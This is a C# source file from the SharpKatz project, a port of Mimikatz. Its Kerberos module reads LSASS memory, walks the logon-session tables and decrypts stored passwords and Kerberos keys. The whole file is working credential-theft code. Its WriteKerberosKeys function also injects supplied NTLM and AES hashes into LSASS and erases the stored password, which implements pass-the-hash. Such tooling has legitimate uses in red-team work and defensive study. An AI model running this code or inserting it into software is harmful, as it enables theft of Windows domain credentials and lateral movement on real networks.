//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Module.Msv1;
using static SharpKatz.Module.Pth;
using static SharpKatz.Win32.Natives;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

namespace SharpKatz.Module
{
    class Kerberos
    {

        static long max_search_size = 500000;

        //static int AES_128_KEY_LENGTH = 16;
        static int AES_256_KEY_LENGTH = 32;

        const int KERB_ETYPE_NULL = 0;
        const int KERB_ETYPE_DES_CBC_CRC = 1;
        const int KERB_ETYPE_DES_CBC_MD4 = 2;
        const int KERB_ETYPE_DES_CBC_MD5 = 3;
        const int KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 = 17;
        const int KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 = 18;


        const int KERB_ETYPE_RC4_MD4 = -128;    // FFFFFF80
        const int KERB_ETYPE_RC4_PLAIN2 = -129;
        const int KERB_ETYPE_RC4_LM = -130;
        const int KERB_ETYPE_RC4_SHA = -131;
        const int KERB_ETYPE_DES_PLAIN = -132;
        const int KERB_ETYPE_RC4_HMAC_OLD = -133;    // FFFFFF7B
        const int KERB_ETYPE_RC4_PLAIN_OLD = -134;
        const int KERB_ETYPE_RC4_HMAC_OLD_EXP = -135;
        const int KERB_ETYPE_RC4_PLAIN_OLD_EXP = -136;
        const int KERB_ETYPE_RC4_PLAIN = -140;
        const int KERB_ETYPE_RC4_PLAIN_EXP = -141;

        const int KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN = -148;
        const int KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN = -149;

        const int KERB_ETYPE_DES_CBC_MD5_NT = 20;
        const int KERB_ETYPE_RC4_HMAC_NT = 23;
        const int KERB_ETYPE_RC4_HMAC_NT_EXP = 24;

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_AVL_TABLE
        {
            public RTL_BALANCED_LINKS BalancedRoot;
            public IntPtr OrderedPointer;
            public uint WhichOrderedElement;
            public uint NumberGenericTableElements;
            public uint DepthOfTree;
            public IntPtr RestartKey;//PRTL_BALANCED_LINKS
            public uint DeleteCount;
            public IntPtr CompareRoutine; //
            public IntPtr AllocateRoutine; //
            public IntPtr FreeRoutine; //
            public IntPtr TableContext;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_BALANCED_LINKS
        {
            public IntPtr Parent;//RTL_BALANCED_LINKS
            public IntPtr LeftChild;//RTL_BALANCED_LINKS
            public IntPtr RightChild;//RTL_BALANCED_LINKS
            public byte Balance;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            public byte[] Reserved; // align
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_10_PRIMARY_CREDENTIAL
        {
            UNICODE_STRING UserName;
            UNICODE_STRING Domaine;
            IntPtr unk0;
            UNICODE_STRING Password;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_LOGON_SESSION_10
        {
            uint UsageCount;
            LIST_ENTRY unk0;
            IntPtr unk1;
            uint unk1b;
            FILETIME unk2;
            IntPtr unk4;
            IntPtr unk5;
            IntPtr unk6;
            LUID LocallyUniqueIdentifier;
            FILETIME unk7;
            IntPtr unk8;
            uint unk8b;
            FILETIME unk9;
            IntPtr unk11;
            IntPtr unk12;
            IntPtr unk13;
            KIWI_KERBEROS_10_PRIMARY_CREDENTIAL credentials;
            uint unk14;
            uint unk15;
            uint unk16;
            uint unk17;
            //IntPtr		unk18;
            IntPtr unk19;
            IntPtr unk20;
            IntPtr unk21;
            IntPtr unk22;
            IntPtr unk23;
            IntPtr unk24;
            IntPtr unk25;
            IntPtr pKeyList;
            IntPtr unk26;
            LIST_ENTRY Tickets_1;
            FILETIME unk27;
            LIST_ENTRY Tickets_2;
            FILETIME unk28;
            LIST_ENTRY Tickets_3;
            FILETIME unk29;
            IntPtr SmartcardInfos;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO
        {
            public uint StructSize;
            public IntPtr isoBlob; //LSAISO_DATA_BLOB aligned;
        };

        [StructLayout(LayoutKind.Explicit)]
        public struct KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607
        {
            [FieldOffset(0)]
            public UNICODE_STRING UserName;
            [FieldOffset(16)]
            public UNICODE_STRING Domaine;
            [FieldOffset(32)]
            public IntPtr unkFunction;
            [FieldOffset(40)]
            public uint type; // or flags 2 = normal, 1 = ISO
            [FieldOffset(48)]
            public UNICODE_STRING Password;
            [FieldOffset(48)]
            public KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO IsoPassword;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_LOGON_SESSION_10_1607
        {
            public uint UsageCount;
            public LIST_ENTRY unk0;
            public IntPtr unk1;
            public uint unk1b;
            public FILETIME unk2;
            public IntPtr unk4;
            public IntPtr unk5;
            public IntPtr unk6;
            public LUID LocallyUniqueIdentifier;
            public FILETIME unk7;
            public IntPtr unk8;
            public uint unk8b;
            public FILETIME unk9;
            public IntPtr unk11;
            public IntPtr unk12;
            public IntPtr unk13;
            public KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607 credentials;
            public uint unk14;
            public uint unk15;
            public uint unk16;
            public uint unk17;
            public IntPtr unk18;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public IntPtr unk22;
            public IntPtr unk23;
            public IntPtr unk24;
            public IntPtr unk25;
            public IntPtr pKeyList;
            public IntPtr unk26;
            public LIST_ENTRY Tickets_1;
            public FILETIME unk27;
            public LIST_ENTRY Tickets_2;
            public FILETIME unk28;
            public LIST_ENTRY Tickets_3;
            public FILETIME unk29;
            public IntPtr SmartcardInfos;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_KEYS_LIST_6
        {
            uint unk0;     // dword_1233EC8 dd 4
            public uint cbItem;   // debug048:01233ECC dd 5
            IntPtr unk1;
            IntPtr unk2;
            IntPtr unk3;
            IntPtr unk4;
            //KERB_HASHPASSWORD_6 KeysEntries[ANYSIZE_ARRAY];
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_HASHPASSWORD_6
        {
            UNICODE_STRING salt;    // http://tools.ietf.org/html/rfc3962
            IntPtr stringToKey; // AES Iterations (dword ?)
            KERB_HASHPASSWORD_GENERIC generic;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_HASHPASSWORD_6_1607
        {
            UNICODE_STRING salt;    // http://tools.ietf.org/html/rfc3962
            IntPtr stringToKey; // AES Iterations (dword ?)
            IntPtr unk0;
            KERB_HASHPASSWORD_GENERIC generic;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_HASHPASSWORD_GENERIC
        {
            public uint Type;
            public UIntPtr Size;
            public IntPtr Checksump;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LSAISO_DATA_BLOB
        {
            public int structSize;
            public int unk0;
            public int typeSize;
            public int unk1;
            public int unk2;
            public int unk3;
            public int unk4;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 48)]
            public byte[] unkKeyData;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] unkData2;
            public int unk5;
            public int origSize;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public byte[] data;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct ENC_LSAISO_DATA_BLOB
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] unkData1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] unkData2;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public byte[] data;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_STORED_CREDENTIAL
        {
            public ushort Revision;
            public ushort Flags;
            public ushort CredentialCount;
            public ushort OldCredentialCount;
            public ushort DefaultSaltLength;
            public ushort DefaultSaltMaximumLength;
            public uint DefaultSaltOffset;
            //KERB_KEY_DATA	Credentials[ANYSIZE_ARRAY];
            //KERB_KEY_DATA	OldCredentials[ANYSIZE_ARRAY];
            //BYTE	DefaultSalt[ANYSIZE_ARRAY];
            //BYTE	KeyValues[ANYSIZE_ARRAY];
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct KERB_STORED_CREDENTIAL_NEW
        {
            public ushort Revision;
            public ushort Flags;
            public ushort CredentialCount;
            public ushort ServiceCredentialCount;
            public ushort OldCredentialCount;
            public ushort OlderCredentialCount;
            public ushort DefaultSaltLength;
            public ushort DefaultSaltMaximumLength;
            public uint DefaultSaltOffset;
            public uint DefaultIterationCount;
            //KERB_KEY_DATA_NEW	Credentials[ANYSIZE_ARRAY];
            //KERB_KEY_DATA_NEW	ServiceCredentials[ANYSIZE_ARRAY];
            //KERB_KEY_DATA_NEW	OldCredentials[ANYSIZE_ARRAY];
            //KERB_KEY_DATA_NEW	OlderCredentials[ANYSIZE_ARRAY];
            //BYTE	DefaultSalt[ANYSIZE_ARRAY];
            //BYTE	KeyValues[ANYSIZE_ARRAY];
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_KEY_DATA_NEW
        {
            public ushort Reserverd1;
            public ushort Reserverd2;
            public uint Reserverd3;
            public uint IterationCount;
            public int KeyType;
            public uint KeyLength;
            public uint KeyOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_KEY_DATA
        {
            public ushort Reserverd1;
            public ushort Reserverd2;
            public uint Reserverd3;
            public int KeyType;
            public uint KeyLength;
            public uint KeyOffset;
        }

        public static List<KerberosLogonItem> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            IntPtr kerbUnloadLogonSessionTableAddr;
            kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, "kerberos.dll", max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);

            //GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);

            return GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);
        }

        private static List<KerberosLogonItem> GetKerberosLogonList(ref IntPtr hLsass, IntPtr kerbUnloadLogonSessionTableAddr, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            List<KerberosLogonItem> klogonlist = new List<KerberosLogonItem>();
            WalkAVLTables(ref hLsass, kerbUnloadLogonSessionTableAddr, klogonlist, oshelper, iv, aeskey, deskey, logonlist);
            return klogonlist;
        }

        private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, List<KerberosLogonItem> klogonlist, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            if (pElement == IntPtr.Zero)
                return;

            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
            RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);

            if (entry.OrderedPointer != IntPtr.Zero)
            {
                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, oshelper.LogonSessionTypeSize);

                KerberosLogonItem item = new KerberosLogonItem();
                item.LogonSessionAddress = entry.OrderedPointer;
                item.LogonSessionBytes = krbrLogonSessionBytes;
                klogonlist.Add(item);
            }

            if (entry.BalancedRoot.RightChild != IntPtr.Zero)
                WalkAVLTables(ref hLsass, entry.BalancedRoot.RightChild, klogonlist, oshelper, iv, aeskey, deskey, logonlist);
            if (entry.BalancedRoot.LeftChild != IntPtr.Zero)
                WalkAVLTables(ref hLsass, entry.BalancedRoot.LeftChild, klogonlist, oshelper, iv, aeskey, deskey, logonlist);

        }

        public static void GetCredentials(ref IntPtr hLsass, byte[] entry, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            if (entry == null)
                return;


            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(entry, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));

            UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionUserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
            UNICODE_STRING usDomain = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionDomaineOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
            UNICODE_STRING usPassword = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionPasswordOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));

            string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
            string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);

            byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, usPassword.MaximumLength);

            byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

            string passDecrypted = "";
            UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
            try
            {
                passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
            }
            catch (Exception)
            {
                passDecrypted = Utility.PrintHexBytes(msvDecryptedPasswordBytes);
            }

            if (!string.IsNullOrEmpty(username) && username.Length > 1)
            {

                Credential.Kerberos krbrentry = new Credential.Kerberos();
                krbrentry.UserName = username;
              
                if (!string.IsNullOrEmpty(domain))
                {
                    krbrentry.DomainName = domain;
                }
                else
                {
                    krbrentry.DomainName = "[NULL]";
                }

                // Check if password is present
                if (!string.IsNullOrEmpty(passDecrypted))
                {
                    krbrentry.Password = passDecrypted;

                }
                else
                {
                    krbrentry.Password = "[NULL]";
                }

                Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                if (currentlogon == null)
                {
                    currentlogon = new Logon(luid);
                    currentlogon.UserName = username;
                    currentlogon.Kerberos = krbrentry;
                    logonlist.Add(currentlogon);
                }
                else
                {
                    currentlogon.Kerberos = krbrentry;
                }
            }
        }

        public static void GetKerberosKeys(ref IntPtr hLsass, byte[] krbrLogonSession, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            Type kerberossessiontype = oshelper.KerberosLogonSessionType;
            Type kerberoshshtype = oshelper.KerberosHashType;

            IntPtr pKeyList = new IntPtr(BitConverter.ToInt64(krbrLogonSession, oshelper.KerberosLogonSessionKeyListOffset));

            if (pKeyList == IntPtr.Zero)
                return;

            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSession, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));

            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6)));

            int items = BitConverter.ToInt32(keylistBytes, Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
            int structsize = Marshal.SizeOf(kerberoshshtype);

            int readsize = items * structsize;

            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), readsize);

            for (int i = 0; i < items; i++)
            {
                int currentindex = (i * structsize) + oshelper.KerberosHashGenericOffset;

                byte[] entryBytes = Utility.GetBytes(hashpassBytes, currentindex, Marshal.SizeOf(typeof(KERB_HASHPASSWORD_GENERIC)));

                KERB_HASHPASSWORD_GENERIC entry = Utility.ReadStruct<KERB_HASHPASSWORD_GENERIC>(entryBytes);

                string keyentry = KerberosTicketEtype((int)entry.Type);

                KerberosKey kkey = new KerberosKey();
                kkey.Type = keyentry;

                UNICODE_STRING checksum = new UNICODE_STRING
                {
                    Length = (ushort)entry.Size,
                    MaximumLength = (ushort)entry.Size,
                    Buffer = entry.Checksump
                };

                if ((int)entry.Size > 0)
                {
                    if ((int)entry.Size > Utility.FieldOffset<LSAISO_DATA_BLOB>("data"))
                    {
                        if ((int)entry.Size <= (Utility.FieldOffset<LSAISO_DATA_BLOB>("data") + ("KerberosKey".Length - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
                        {
                            byte[] isoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Marshal.SizeOf(typeof(LSAISO_DATA_BLOB)));
                            LSAISO_DATA_BLOB isoblob = Utility.ReadStruct<LSAISO_DATA_BLOB>(isoblobBytes);

                            kkey.Key = GenericLsaIsoOutput(isoblob);
                        }
                        else
                        {
                            byte[] encisoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Marshal.SizeOf(typeof(LSAISO_DATA_BLOB)));
                            ENC_LSAISO_DATA_BLOB encisoblob = Utility.ReadStruct<ENC_LSAISO_DATA_BLOB>(encisoblobBytes);

                            kkey.Key = GenericEncLsaIsoOutput(encisoblob, (int)entry.Size);
                        }
                    }
                    else
                    {
                        byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, checksum.MaximumLength);

                        byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);
                        kkey.Key = Utility.PrintHashBytes(msvDecryptedPasswordBytes);
                    }
                }
                else
                {
                    kkey.Key = "<no size, buffer is incorrect>";
                }

                Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);

                if (currentlogon != null)
                {
                    if (currentlogon.KerberosKeys == null)
                        currentlogon.KerberosKeys = new List<KerberosKey>();

                    currentlogon.KerberosKeys.Add(kkey);
                }
            }
        }

        public static void WriteKerberosKeys(ref IntPtr hLsass, KerberosLogonItem krbrLogonSession, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref SEKURLSA_PTH_DATA pthData)
        {
            Type kerberossessiontype = oshelper.KerberosLogonSessionType;
            Type kerberoshshtype = oshelper.KerberosHashType;

            byte[] krbrLogonSessionBites = krbrLogonSession.LogonSessionBytes;

            byte[] encNtlmHashBytes = null;
            byte[] encAes128Bytes = null;
            byte[] encAes256Bytes = null;

            IntPtr pKeyList = new IntPtr(BitConverter.ToInt64(krbrLogonSessionBites, oshelper.KerberosLogonSessionKeyListOffset));

            if (pKeyList == IntPtr.Zero)
                return;

            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBites, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));

            if (pthData.LogonId.HighPart != luid.HighPart || pthData.LogonId.LowPart != luid.LowPart)
                return;

            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6)));

            if (pthData.NtlmHash != null)
            {
                encNtlmHashBytes = Crypto.BCrypt.EncryptCredentials(pthData.NtlmHash, iv, aeskey, deskey);
            }
            if (pthData.Aes128Key != null)
            {
                encAes128Bytes = Crypto.BCrypt.EncryptCredentials(pthData.Aes128Key, iv, aeskey, deskey);
            }
            if (pthData.Aes256Key != null)
            {
                encAes256Bytes = Crypto.BCrypt.EncryptCredentials(pthData.Aes256Key, iv, aeskey, deskey);
            }

            int items = BitConverter.ToInt32(keylistBytes, Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
            int structsize = Marshal.SizeOf(kerberoshshtype);

            int readsize = items * structsize;

            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), readsize);

            Console.WriteLine("[*]  \\_ kerberos - data copy @ {0:X}", IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))).ToInt64());

            pthData.isReplaceOk = true;
            for (int i = 0; (i < items) && pthData.isReplaceOk; i++)
            {

                byte[] bytesToWrite = null;

                int currentindex = (i * structsize) + oshelper.KerberosHashGenericOffset;

                byte[] entryBytes = Utility.GetBytes(hashpassBytes, currentindex, Marshal.SizeOf(typeof(KERB_HASHPASSWORD_GENERIC)));

                KERB_HASHPASSWORD_GENERIC entry = Utility.ReadStruct<KERB_HASHPASSWORD_GENERIC>(entryBytes);

                string keyentry = KerberosTicketEtype((int)entry.Type);

                UNICODE_STRING checksum = new UNICODE_STRING
                {
                    Length = (ushort)entry.Size,
                    MaximumLength = (ushort)entry.Size,
                    Buffer = entry.Checksump
                };

                if (encNtlmHashBytes != null && ((entry.Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (entry.Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && ((int)entry.Size == LM_NTLM_HASH_LENGTH))
                {
                    bytesToWrite = encNtlmHashBytes;
                }
                else if (encAes128Bytes != null && (entry.Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && ((int)entry.Size == AES_128_KEY_LENGTH))
                {
                    bytesToWrite = encAes128Bytes;
                }
                else if (encAes256Bytes != null && (entry.Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && ((int)entry.Size == AES_256_KEY_LENGTH))
                {
                    bytesToWrite = encAes256Bytes;
                }
                else
                {
                    Console.WriteLine("[*]    \\_ {0} -> null", keyentry);
                }

                if (bytesToWrite != null)
                {
                    pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, checksum.Buffer, bytesToWrite);
                    Console.WriteLine("[*]    \\_ {0} {1} ", keyentry, (pthData.isReplaceOk) ? "OK" : "null");
                }
            }

            if (pthData.isReplaceOk)
            {
                byte[] pasreplace = new byte[oshelper.KerberosPasswordEraseSize];

                Console.WriteLine("[*]    \\_ *Password replace @ {0:X} ({1}) -> null", IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase).ToInt64(), oshelper.KerberosPasswordEraseSize);

                pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase), pasreplace);
                
            }
        }

        public static string KerberosTicketEtype(int eType)
        {
            string type;
            switch (eType)
            {
                case KERB_ETYPE_NULL: type = "null             "; break;
                case KERB_ETYPE_DES_PLAIN: type = "des_plain        "; break;
                case KERB_ETYPE_DES_CBC_CRC: type = "des_cbc_crc      "; break;
                case KERB_ETYPE_DES_CBC_MD4: type = "des_cbc_md4      "; break;
                case KERB_ETYPE_DES_CBC_MD5: type = "des_cbc_md5      "; break;
                case KERB_ETYPE_DES_CBC_MD5_NT: type = "des_cbc_md5_nt   "; break;
                case KERB_ETYPE_RC4_PLAIN: type = "rc4_plain        "; break;
                case KERB_ETYPE_RC4_PLAIN2: type = "rc4_plain2       "; break;
                case KERB_ETYPE_RC4_PLAIN_EXP: type = "rc4_plain_exp    "; break;
                case KERB_ETYPE_RC4_LM: type = "rc4_lm           "; break;
                case KERB_ETYPE_RC4_MD4: type = "rc4_md4          "; break;
                case KERB_ETYPE_RC4_SHA: type = "rc4_sha          "; break;
                case KERB_ETYPE_RC4_HMAC_NT: type = "rc4_hmac_nt      "; break;
                case KERB_ETYPE_RC4_HMAC_NT_EXP: type = "rc4_hmac_nt_exp  "; break;
                case KERB_ETYPE_RC4_PLAIN_OLD: type = "rc4_plain_old    "; break;
                case KERB_ETYPE_RC4_PLAIN_OLD_EXP: type = "rc4_plain_old_exp"; break;
                case KERB_ETYPE_RC4_HMAC_OLD: type = "rc4_hmac_old     "; break;
                case KERB_ETYPE_RC4_HMAC_OLD_EXP: type = "rc4_hmac_old_exp "; break;
                case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN: type = "aes128_hmac_plain"; break;
                case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN: type = "aes256_hmac_plain"; break;
                case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96: type = "aes128_hmac      "; break;
                case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96: type = "aes256_hmac      "; break;
                default: type = "unknow           "; break;
            }
            return type;
        }

        private static string GenericLsaIsoOutput(LSAISO_DATA_BLOB blob)
        {

            GCHandle pntDataPinnedArray = GCHandle.Alloc(blob.data, GCHandleType.Pinned);
            IntPtr pntData = pntDataPinnedArray.AddrOfPinnedObject();

            IntPtr pntEncrypted = IntPtr.Add(pntData, blob.typeSize);

            GCHandle pntUnkData2PinnedArray = GCHandle.Alloc(blob.unkData2, GCHandleType.Pinned);
            IntPtr pntUnkData2 = pntUnkData2PinnedArray.AddrOfPinnedObject();

            byte[] unkKeyData = new byte[3 * 16];
            Array.Copy(blob.unkKeyData, unkKeyData, 3 * 16);

            byte[] encrypted = new byte[blob.origSize];
            Marshal.Copy(pntEncrypted, encrypted, 0, blob.origSize);

            byte[] unkData2 = new byte[16];
            Array.Copy(blob.unkData2, unkData2, unkData2.Length);

            StringBuilder sb = new StringBuilder();

            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t   * LSA Isolated Data: {0}", Marshal.PtrToStringAuto(pntData));
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t     Unk-Key  : {0}", Utility.PrintHexBytes(unkKeyData));
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t     Encrypted: {0}", Utility.PrintHexBytes(encrypted));
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t\t   SS:{0}, TS:{1}, DS:{2}", blob.structSize, blob.typeSize, blob.origSize);
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t\t   0:0x{0:X}, 1:0x{1:X}, 2:0x{2:X}, 3:0x{3:X}, 4:0x{4:X}, E:", blob.unk0, blob.unk1, blob.unk2, blob.unk3, blob.unk4);
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, Utility.PrintHexBytes(unkData2));
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, ", 5:0x{0:X}", blob.unk5);

            pntDataPinnedArray.Free();
            pntUnkData2PinnedArray.Free();

            return sb.ToString();
        }

        private static string GenericEncLsaIsoOutput(ENC_LSAISO_DATA_BLOB blob, int size)
        {
            byte[] unkData1 = new byte[16];
            Array.Copy(blob.unkData1, unkData1, unkData1.Length);

            byte[] encrypted = new byte[size - Utility.FieldOffset<ENC_LSAISO_DATA_BLOB>("data")];
            Array.Copy(blob.data, encrypted, encrypted.Length);

            byte[] unkData2 = new byte[16];
            Array.Copy(blob.unkData2, unkData2, unkData2.Length);

            StringBuilder sb = new StringBuilder();

            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t   * unkData1 : {0}", Utility.PrintHexBytes(unkData1));
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t     unkData2 : {0}", Utility.PrintHexBytes(unkData2));
            sb.AppendFormat(NumberFormatInfo.InvariantInfo, "\n\t     Encrypted: {0}", Utility.PrintHexBytes(encrypted));

            return sb.ToString();
        }

        public class KerberosLogonItem
        {
            public IntPtr LogonSessionAddress { get; set; }
            public byte[] LogonSessionBytes { get; set; }
        }

    }
}
